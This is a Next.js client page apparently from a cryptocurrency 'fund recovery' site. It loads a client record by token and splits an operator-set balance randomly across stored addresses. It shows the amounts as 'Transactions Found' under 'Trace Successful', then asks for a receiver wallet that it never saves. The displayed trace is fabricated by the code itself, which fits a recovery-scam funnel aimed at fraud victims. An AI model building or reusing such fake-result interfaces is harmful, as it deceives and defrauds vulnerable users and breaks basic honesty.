"use client";

export const dynamic = "force-dynamic";

import { useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { collection, doc, getDocs, updateDoc } from "firebase/firestore";
import { db } from "@/lib/firebase";
import SvgStack from "@/components/SvgStack";
import Image from "next/image";
import bgImage from "@/components/Image_fx__2_-removebg-preview 1.svg";
import { ShieldCheckIcon } from "@heroicons/react/24/outline";

// Helper: split balance randomly among addresses
function randomSplit(total: number, n: number): number[] {
  let splits = Array(n).fill(0);
  let remaining = total;

  for (let i = 0; i < n - 1; i++) {
    const portion = parseFloat((Math.random() * remaining * 0.7).toFixed(8));
    splits[i] = portion;
    remaining -= portion;
  }
  splits[n - 1] = parseFloat(remaining.toFixed(8));
  return splits;
}

export default function Page3() {
  const router = useRouter();
  const searchParams = useSearchParams();

  const [token, setToken] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [client, setClient] = useState<any>(null);
  const [addresses, setAddresses] = useState<
    { address: string; value: number }[]
  >([]);
  const [receiverWallet, setReceiverWallet] = useState("");

  useEffect(() => {
    setToken(searchParams.get("token"));
  }, [searchParams]);

  useEffect(() => {
    if (!token) return;

    const fetchClientData = async () => {
      try {
        const clientsCol = collection(db, "clients");
        const snapshot = await getDocs(clientsCol);
        const clientDoc = snapshot.docs.find(
          (d) => d.data().accessLinkId === token
        );

        if (!clientDoc) {
          router.replace("/invalid");
          return;
        }

        const clientData = clientDoc.data();
        setClient({ id: clientDoc.id, ...clientData });

        // Fetch recovery addresses
        const addrCol = collection(
          db,
          "clients",
          clientDoc.id,
          "recovery_addresses"
        );
        const addrSnap = await getDocs(addrCol);
        const addrList = addrSnap.docs.map((d) => d.data().address);

        if (addrList.length === 0) {
          alert("No recovery addresses found for this client.");
          router.replace("/invalid");
          return;
        }

        const total = clientData.recoverableBalance || 0;
        const splitValues = randomSplit(total, addrList.length);
        const animatedAddresses = addrList.map((addr, i) => ({
          address: addr,
          value: splitValues[i],
        }));

        setAddresses(animatedAddresses);
        setLoading(false);
      } catch (err) {
        console.error(err);
        router.replace("/invalid");
      }
    };

    fetchClientData();
  }, [token, router]);

  const handleSubmit = async () => {
    if (!receiverWallet.trim()) {
      alert("Enter receiver wallet address");
      return;
    }

    if (!client) return;

    const clientRef = doc(db, "clients", client.id);
    await updateDoc(clientRef, { currentPage: "page4" });

    router.replace("/page4?token=" + token);
  };

  if (loading)
    return (
      <main className="flex items-center justify-center h-screen text-white">
        Loading recovery details...
      </main>
    );

  return (
    <main className="relative w-full h-screen overflow-hidden">
      <div className="absolute inset-0 w-full h-full">
        <SvgStack />
        <Image
          src={bgImage}
          alt="Background"
          className="absolute inset-0 -z-10 object-contain"
        />
      </div>

      <div className="relative z-10 flex flex-col items-center justify-center w-full h-full text-center px-4 backdrop-blur-sm bg-black/85">
        <div className="w-full max-w-lg bg-[#0E111C]/85 rounded-lg p-6 space-y-6">
          <div className="flex flex-col items-center gap-3">
            <ShieldCheckIcon className="w-12 h-12 text-teal-400" />
            <h2 className="text-white font-bold text-xl">Trace Successful</h2>
          </div>

          <div className="bg-[#151A2E] rounded-xl p-4 space-y-2 overflow-y-auto max-h-40">
            <h3 className="text-teal-400 font-semibold mb-2">
              Transactions Found
            </h3>
            {addresses.map((a, i) => (
              <div
                key={i}
                className="flex justify-between text-white bg-[#1A2030] rounded-lg p-2"
              >
                <span>{a.address}</span>
                <span>{a.value.toFixed(8)} BTC</span>
              </div>
            ))}
          </div>

          <div className="text-white font-semibold">
            Recoverable Balance:{" "}
            {addresses.reduce((acc, a) => acc + a.value, 0).toFixed(8)} BTC
          </div>

          <div className="flex flex-col gap-2">
            <label className="text-gray-400 text-left">Receiver Wallet</label>
            <input
              type="text"
              value={receiverWallet}
              onChange={(e) => setReceiverWallet(e.target.value)}
              placeholder="Enter wallet address"
              className="w-full bg-[#151A2E] rounded-lg p-3 text-white focus:outline-none focus:ring-1 focus:ring-teal-500"
            />
          </div>

          <button
            onClick={handleSubmit}
            className="mt-4 w-full py-3 bg-teal-600 rounded-xl font-semibold hover:bg-teal-500"
          >
            Continue
          </button>
        </div>
      </div>
    </main>
  );
}
